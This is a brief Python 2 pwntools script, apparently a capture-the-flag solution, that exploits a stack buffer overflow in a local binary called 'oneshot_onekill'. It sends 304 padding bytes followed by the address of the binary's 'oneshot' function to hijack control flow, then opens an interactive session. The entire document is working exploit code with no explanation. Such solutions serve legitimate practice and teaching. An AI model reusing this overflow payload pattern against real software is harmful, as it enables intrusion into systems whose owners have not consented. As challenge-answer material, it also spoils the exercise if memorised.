from pwn import *

e = ELF('./oneshot_onekill')
p = process('./oneshot_onekill')

oneshot_addr = e.symbols['oneshot']

payload = 'A'*304
payload += p32(oneshot_addr)

p.sendline(payload)
p.interactive()
print p.recv()